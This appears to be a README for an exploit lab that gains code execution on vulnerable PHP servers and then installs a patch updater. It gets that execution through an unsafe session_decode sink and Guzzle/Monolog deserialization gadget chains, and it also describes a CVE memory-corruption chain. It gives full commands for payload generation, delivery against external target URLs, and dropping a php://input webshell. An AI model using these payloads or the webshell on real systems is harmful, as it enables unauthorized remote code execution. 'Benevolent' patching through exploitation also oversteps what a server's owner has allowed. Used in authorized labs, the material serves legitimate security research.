# benevolent-php — PHP2Shell lab (CVE-2026-109618 / CVE-2026-109619)

Delivers the `php2shell_updater.php` patch to a vulnerable PHP 8.1.34 target
in one HTTP POST and returns the installation result in the response body.

> **Read this before judging the claims.** The POST exercises the real
> PHP2Shell trigger path — the pre-RINIT `session.upload_progress` handler,
> the `min_freq` session re-init window, and (rung 3) a chunked
> OOM-bailout variant — but **that CVE path executes nothing here**: the
> memory-corruption RCE is build-specific, and the public PoC authors did not
> reproduce a universal chain for it either. The working code execution comes
> from a **separate, app-specific unsafe `session_decode()` sink** in the lab
> app combined with **real-package deserialization gadgets** (phpggc
> `Guzzle/RCE/1`, `Monolog/FW/1`). That execution path does **not** depend on
> the CVEs and works the same on patched PHP. There is no ASLR bypass and no
> heap grooming here. Section 3 documents exactly where each claim sits.
>
> **Authorization**: run this only against systems you own or are explicitly
> authorized to test. The payload executes shell commands with the PHP
> worker's privileges (root in the demo container).

---

## 1. Running the demo (local Docker lab)

### 1.1 Start the vulnerable container

The demo target is a stock `php:8.1-cli` image (PHP 8.1.34 is EOL and has no
official PHP2Shell patch) running the built-in server:

```bash
docker run -d --name php81-original -p 8080:8080 \
  -v "$(pwd):/app" -w /app \
  php:8.1-cli bash -c 'php -S 0.0.0.0:8080 -t /app & wait'
```

> Do **not** add `--rm` for the demo: if the server process dies mid-test the
> container exits and Docker removes its filesystem. Also note the updater's
> *internal* restart mode cannot be used with this `bash -c '... & wait'`
> launcher — the kill of `php -S` makes bash's `wait` return and the container
> exits. The delivery therefore uses the updater's
> `--external-restart` contract and restarts the container from outside.

Sanity check (the app must be reachable and report 8.1.34):

```bash
curl http://0.0.0.0:8080/test.php
# PHP version: 8.1.34
```

### 1.2 Install the app dependencies (first time only)

`test.php` is a Composer app. Install the (deliberately version-pinned)
packages inside the container:

```bash
docker exec -w /app php81-original sh -c '
  apt-get update -qq && apt-get install -y -qq unzip &&
  curl -sS https://getcomposer.org/installer | php -- --quiet --install-dir=/tmp --filename=composer &&
  /tmp/composer config policy.advisories.block false &&
  /tmp/composer install --no-interaction --no-progress'
```

`composer.lock` pins the versions the gadget chains target
(`guzzlehttp/guzzle` 6.3.2, `guzzlehttp/psr7` 1.4.2, `monolog/monolog` ^3);
`policy.advisories.block false` is needed because Composer refuses to
install those known-vulnerable versions otherwise — appropriate for a lab.

### 1.3 Validate the chain

Prove code execution with a harmless command before the real install:

```bash
python3 deliver_update.py --command 'id; echo PWNED > /tmp/pwned.txt'
docker exec php81-original cat /tmp/pwned.txt   # PWNED
```

### 1.4 Dry-run the updater

Same delivery, but the updater prints its plan without changing anything:

```bash
python3 deliver_update.py --dry-run
```

### 1.5 Install the patch

Record the pre-state, run the delivery, then verify:

```bash
docker exec php81-original php /app/php2shell_verify.php --before

python3 deliver_update.py                       # ~2-4 min (image download)

docker exec php81-original php /app/php2shell_verify.php --after
```

The single POST's response body is the installation result
(`PASS: installed patched runtime ...`, `SERVER_RESTART_REQUIRED`); the script
then runs `docker restart php81-original` and waits for the server to come
back. `--after` should report `PATCHED_VERIFIED_BACKPORT` with the worker
running the new binary hash. The exact raw request is saved to
`artifacts/deliver_update.request` and the result to
`artifacts/deliver_result.txt`.

### 1.6 Alternative modes

| Mode | What it does |
|---|---|
| `--mode guzzle-rce` (default) | **one POST**; `FnStream`/`HandlerStack` destructor chain runs the command; result in the response |
| `--mode write-invoke` | two POSTs; Monolog destructor chain writes a webshell to the docroot, then the second POST invokes it |
| `--mode trigger-only` | chunked (no Content-Length) multipart that drives the upload-progress path into the `memory_limit` bailout — exercises the CVE trigger, executes nothing |
| `--mode cve-chain` | drives the vendored **CVE-proper RCE chain** (research/cve-chain/, mod_php prefork, php:8.4.26-apache lab) and runs the updater through the forged-`pDestructor` → `zif_system` execution — the exploit's PROOF output is the updater's own result |
| `--command '...'` | override the executed command (default: install + restart) |
| `--no-stall` | skip the `min_freq` mid-upload stall |

---

## 2. Running the upgrade tool against an external server

### 2.1 What the target must look like

The delivery assumes the documented application chain (see "How it works"):

* A **vulnerable PHP runtime** (any PHP serving web requests < 8.2.35 /
  8.3.36 / 8.4.27 / 8.5.12; the demo uses 8.1.34) with
  `session.upload_progress.enabled=1` (the default).
* The app calls `session_start()` **and** decodes attacker-supplied session
  bytes somewhere (the lab's `cart_state` restore feature — the same class of
  primitive as the historical Joomla session bugs). On 8.1's `php` session
  handler the upload-progress marker alone cannot carry the payload (see
  "How it works").
* The gadget classes are **loaded before the decode**: for rung 1,
  `GuzzleHttp\Psr7\FnStream` + `GuzzleHttp\HandlerStack` (guzzle 6.0.0–6.3.2,
  psr7 < 1.5.0); for rung 2, Monolog 3's `GroupHandler`/`DeduplicationHandler`.
  Any real app that boots these packages qualifies.
* The updater itself needs what its header documents: PHP 7.0+ CLI,
  `proc_open`, GNU tar, root (or sudo for apt), and egress to `ghcr.io` for
  the pinned prebuilt image — or apt/brew for managed installs.

The **restart step** is the only part that depends on where PHP lives:

* **Containerized target** (Docker-style `/usr/local` PHP, like the demo):
  use `--apply --external-restart`. The updater installs the binaries and
  prints `SERVER_RESTART_REQUIRED`; it deliberately does *not* restart
  anything itself (its internal restart helper would kill the server process
  out from under the container's init/`wait` chain). Restart the container
  from outside afterwards — `docker restart` or your orchestrator.
* **Bare-metal target** (PHP installed via apt/brew, FPM/Apache as managed
  services): use `--apply` only. The updater installs the official fixed
  packages and restarts the services itself; `--external-restart` is
  rejected there (`--external-restart requires a Docker-style /usr/local
  PHP installation`).

The exploit stage (trigger POST, session payload, gadget chain) is identical
in both cases — only the updater flags and the post-run restart step differ.

If the target doesn't provide the session-decode primitive, use `--mode
write-invoke` if it provides the Monolog classes, or `--mode trigger-only`
to exercise the CVE trigger (which executes nothing).

### 2.2 Generate the payload locally (no Docker needed)

`payload/gen_session_payload.php` is self-contained (phpggc gadget skeletons,
Apache-2.0) — run it with any local PHP CLI (8.1+ for the Monolog chain;
7.0+ for the Guzzle chain):

```bash
php payload/gen_session_payload.php --guzzle-rce \
  "$(python3 deliver_update.py --print-command)" > /tmp/cart_state.b64
```

`--print-command` emits exactly the install command the script assumes
(materialize the updater from base64, then run it with `--apply
--external-restart` — override with `--apply-flags` for bare metal). For a
custom command, generate the payload with the same string you pass to
`--command`.

For the webshell rung, bake a fixed shell path into the payload:

```bash
php payload/gen_session_payload.php --monolog-fw /app/shell_x.php \
  '<?php echo shell_exec(file_get_contents("php://input"));?>' > /tmp/cart_state.b64
```

### 2.3 Deliver

```bash
# single-POST chain (external: the script never touches Docker)
python3 deliver_update.py \
  --url https://target.example/app.php \
  --cart-state /tmp/cart_state.b64 \
  --no-restart

# webshell write + invoke (must match the baked shell path)
python3 deliver_update.py \
  --url https://target.example/app.php \
  --mode write-invoke --shell-name shell_x.php \
  --cart-state /tmp/cart_state.b64 \
  --no-restart
```

For **bare-metal** targets (apt/brew-managed PHP), pass `--apply-flags
--apply` — the updater restarts the managed services itself and
`--external-restart` is container-only.

### 2.4 Finish the restart and verify

For containerized targets, restart the container (or its orchestrator) after
the response — the updater printed `SERVER_RESTART_REQUIRED`:

```bash
docker -H ... restart <container>        # or your orchestrator
```

Then run the verifier on the target and confirm the web worker binary:

```bash
php php2shell_verify.php --after          # expect PATCHED_VERIFIED_BACKPORT
```

---

## 3. How it works

### 3.1 The vulnerabilities

CVE-2026-109618 ("OOM corruption") and CVE-2026-109619 ("stale global
state"), fixed 2026-10-21 in PHP 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12. The
exploitable surface is the **`session.upload_progress` handler** (on by
default since PHP 5.4), which runs **during request startup, before RINIT and
before any application code**:

* When a multipart request carries `PHP_SESSION_UPLOAD_PROGRESS` and a file
  part, the rfc1867 parser activates the session identified by the
  `PHPSESSID` cookie **or form field** and updates progress data into the
  session store. Each throttled update (`min_freq` = 1 s) calls
  `php_session_initialize()` again — re-reading and re-decoding the session
  file before the application ever runs.
* An OOM `bailout()` (longjmp) during this window exits cleanup paths that
  leave request state half-initialized; `BG(unserialize)` bookkeeping from
  an aborted request survives into the next request and is re-used — the
  use-after-free the CVEs describe.

### 3.2 Why the lab app looks the way it does

Three findings from the research (all verified against 8.1.34 and the public
PoC material) shape the design:

1. **Stock PHP 8.1 has no built-in gadget class.** Every public PoC lab
   either compiles a custom extension or uses a real framework's POP chain.
   This lab uses real Composer packages and phpggc's documented chains.
2. **The 8.1 session encoder refuses keys containing `|`**
   (`php_session_encode`, session.c:965 — the write is skipped), so the
   upload-progress marker alone cannot smuggle serialized bytes into the
   session store over HTTP. The bytes must enter through the application:
   `test.php`'s `cart_state` restore feature (`session_decode` of
   base64-decoded POST input) is the Joomla-class primitive real attacks used.
3. **The gadget-free heap RCE** (the "single-request `zend_fcall_info`"
   narrative) is build-specific and was *not universally reproduced* by the
   public PoC authors; rung 3 exercises the trigger and documents that
   boundary rather than faking it. Guzzle 7's `FileCookieJar::save()` also
   fails on `php://filter` wrappers (`LOCK_EX`), and its JSON output cannot
   carry code — so the chains below, not filter tricks, carry the payload.

### 3.3 The delivery POST

One multipart POST to the app:

| Field | Role |
|---|---|
| `PHPSESSID` | fixes the session id (works even with `use_only_cookies=1`) |
| `PHP_SESSION_UPLOAD_PROGRESS` | engages the CVE-affected pre-RINIT handler; the mid-upload stall crosses `min_freq` and triggers the session re-init window |
| `cart_state` | base64 of `restore\|<serialized gadget>` — decoded by the app's session-restore feature |
| `attachment` | the complete `php2shell_updater.php` source, saved to `/tmp/php2shell_updater.php` by the app's import feature (the command also embeds it base64-encoded, so it works without that feature) |

### 3.4 The execution chains (phpggc, real packages)

**Rung 1 — Guzzle/RCE/1** (guzzle 6.0.0–6.3.2 + psr7 < 1.5.0, vector
`__destruct`):

```
session_decode("restore|O:24:\"GuzzleHttp\\Psr7\\FnStream\":...")
  └─ FnStream::__destruct()  → call_user_func(_fn_close)
       └─ [HandlerStack('system', CMD), 'resolve']
            └─ resolve(): $prev = CMD; foreach (stack) $prev = $fn[0]($prev)
                 └─ system(CMD)         # CMD = php -r '...b64...' && php /tmp/php2shell_updater.php --apply --external-restart
```

The destructor runs at request shutdown, so the updater's complete stdout
becomes the HTTP response body — the "installation result".

**Rung 2 — Monolog/FW/1** (monolog 3.x, vector `__destruct`):

```
GroupHandler([DeduplicationHandler(buffer=[LogRecord(message=SHELL_CODE), ...])])
  └─ __destruct → close() → BufferHandler::close() → DeduplicationHandler::flush()
       └─ file_put_contents("/app/shell_x.php", "<ts>:Debug:" . SHELL_CODE)
```

The dropped file is valid PHP (the `<ts>:Debug:` prefix is echoed as text);
the second POST to it runs `shell_exec(file_get_contents("php://input"))`
with the command as the body. The script removes the webshell afterwards.

Both payloads are generated with **PHP's own `serialize()`**
(`payload/gen_session_payload.php`, phpggc gadget skeletons) so private
property mangling matches the target classes exactly.

### 3.5 The updater and the restart

`php /tmp/php2shell_updater.php --apply --external-restart`:

1. Detects the official Docker-style `/usr/local/bin/php` (8.1.34, trixie,
   cli) and selects the matching digest-pinned image
   `ghcr.io/mpyw/php-eol-cve-2026-109618-109619` (patched EOL backports —
   8.1 gets no official fix).
2. Downloads every layer over HTTPS with an anonymous GHCR token, verifying
   each blob's SHA-256 against the pinned manifest; extracts only
   `usr/local/*` with GNU tar; refuses unsafe paths.
3. Verifies ABI/extension compatibility, backs up the current binaries, and
   atomically replaces the 7 runtime files; writes the install receipt that
   `php2shell_verify.php --after` checks.
4. Prints `SERVER_RESTART_REQUIRED` — the delivery script restarts the
   container, and the new `php -S` process serves from the patched binary
   (the verifier confirms the *live worker* hash matches disk, not just the
   CLI).

### 3.6 Limits and precise claims

**Upgrade target matrix (measured):** the CVE-proper RCE executes the updater
on the Apache lab (`--mode cve-chain`, PROOF captured) — and the updater
refuses to upgrade that target, twice over, by design: as the www-data
worker, `PERMISSION_DENIED: Root is required for /usr/local binary
replacement`; as root, `RESTART_UNAVAILABLE: Cannot safely restart running
apache process 1`. Even with a restart contract, the pinned image catalogue
ships no patched `libphp.so` (the Apache web component), so the upgrade of
an Apache target is an updater-project decision, not a delivery-script one.
The complete install + restart + verified flow remains on the targets the
updater supports (Docker-style `/usr/local` PHP with php -S or FPM).

* **The CVE path is trigger-only.** Rungs 1–2 execute code, but their
  execution does not come from the CVE-2026-109618/109619 memory-corruption
  primitives: it comes from the lab app's unsafe `session_decode()` sink
  plus the Guzzle/Monolog deserialization gadgets, a classic object-injection
  chain that works the same on patched PHP. Rung 3 exercises the actual CVE
  trigger (pre-RINIT upload-progress handling / OOM-bailout window) and
  executes nothing.
* **The CVE itself is demonstrated live (see `research/`):**
  * **CVE-proper RCE — achieved** against stock `php:8.4.26-apache`
    (amd64): the vendored public chain (research/cve-chain/) leaks the heap
    and libphp bases via the `Set-Cookie` OOB read, then a forged
    `zend_array.pDestructor` calls `zif_system` — `uid=33(www-data)` proof
    captured, two consecutive runs (research/cve-chain/proof_run.txt).
    Requires mod_php prefork on Linux (fork-based worker rotation).
  * Against stock **8.1.34 FPM** (the lab's branch): the 109618 OOM-bailout
    trigger fires (`Allowed memory size of 4194304 bytes exhausted` during
    request parsing) and the 109619 stale-`BG(unserialize)`
    producer/consumer ends in a worker **SIGSEGV**; the freed
    `php_unserialize_data` (8216 bytes → 8232 ZendMM block on 8.1 — the
    8.5-based geometry in the public kits does not apply) was reclaimed
    with attacker-controlled bytes and the INIT writes land inside them
    (research/stage1_reclaim.md). php -S cannot even arm the OOM
    (`post_max_size` applies to chunked bodies).
* The execution stage requires one of the real gadget classes to be loaded
  before the decode and a session-decode primitive in the app — without
  either, the published material provides no universal code-execution path
  for this build.
* The pinned image is a third-party community backport (digest-pinned and
  receipt-verified; provenance-based, not a behavioral exploit test).
* The updater only supports the installations its header lists
  (Docker-style `/usr/local` PHP, Debian/Ubuntu APT, macOS Homebrew); other
  targets fail closed.
